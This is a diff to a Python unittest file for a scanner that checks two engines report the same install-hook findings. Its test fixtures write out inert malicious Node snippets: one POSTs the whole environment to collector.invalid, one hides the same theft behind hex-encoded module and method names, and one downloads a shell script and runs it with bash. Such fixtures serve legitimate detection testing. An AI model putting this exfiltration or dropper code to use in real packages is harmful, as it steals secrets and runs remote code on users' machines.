@@ -5,7 +5,7 @@ CLIs scan the same tree and must report the same findings, metrics, ratings,
 gate and exit code. These trees are the review's reproductions; where a fix
 is about what a snippet shows (redaction), the snippets are compared too.
 All content is inert: nothing is executed, hosts are TEST-NET (192.0.2.x) or
-.invalid, credentials are dummies. Skipped where Node isn't installed.
+.invalid, credentials are dummies. Skipped where the npm engine is not built (node, and npm run build in js/).
 """
 
 import collections
@@ -40,7 +40,7 @@ def snippets(report):
                                for i in report["issues"] if not parity._python_only(i, project=report["project"]))
 
 
-@unittest.skipUnless(parity.NODE, "node is not installed")
+@unittest.skipUnless(parity.NPM_READY, parity.NPM_SKIP)
 class CoreParityTests(unittest.TestCase):
     maxDiff = None
     assert_same = parity.EngineParityTests.assert_same
@@ -214,10 +214,13 @@ class CoreParityTests(unittest.TestCase):
                    "spawn(process.execPath, [filePath], { detached: true, stdio: 'ignore' }).unref();\n")
         worker = ("const https = require('https');\nconst body = JSON.stringify(process.env);\n"
                   "https.request({ host: 'collector.invalid', method: 'POST' }).end(body);\n")
+        # (the module's name and its method's hidden: the tree sees no request until
+        # the decoded view names them)
         metrics = ("(() => {\n  const a = require(\n    Buffer.from(\"%s\", \"hex\").toString()\n  );\n"
                    "  const e = Object.keys(process[\"env\"]).map(k => [k, process[\"env\"][k]]);\n"
-                   "  a.request({ hostname: 'collector.invalid', method: 'POST' }).end(JSON.stringify(e));\n})();\n"
-                   % "https".encode().hex())
+                   "  a[Buffer.from(\"%s\", \"hex\").toString()]({ hostname: 'collector.invalid', method: 'POST' })"
+                   ".end(JSON.stringify(e));\n})();\n"
+                   % ("https".encode().hex(), "request".encode().hex()))
         dropper = ("const fs = require('fs');\nconst { spawn } = require('child_process');\n(async () => {\n"
                    "  const r = await fetch('https://files.invalid/s.sh');\n  fs.writeFileSync(f, await r.text());\n"
                    "  spawn('bash', [f]);\n})();\n")
@@ -250,8 +253,8 @@ class CoreParityTests(unittest.TestCase):
                         msgs = {i["file"].replace("\\", "/"): i["msg"] for i in py[1]["issues"]
                                 if i["rule"] == "SC-INSTALL-HOOK" and i["sev"] == "CRITICAL"}
                         self.assertEqual(msgs["node_modules/starter/package.json"],
-                                         "Install hook runs lib/start.js, which starts lib/worker/run.js, which reads "
-                                         "environment variables or credential files and sends data over the network.")
+                                         "Install hook runs lib/start.js, which starts lib/worker/run.js, which sends "
+                                         "environment variables over the network (the whole environment).")
                         self.assertEqual(msgs["node_modules/dropper/package.json"],
                                          "Install hook runs i.js, which downloads a script and runs it with bash.")
                         self.assertTrue(msgs["node_modules/metrics/package.json"].endswith(
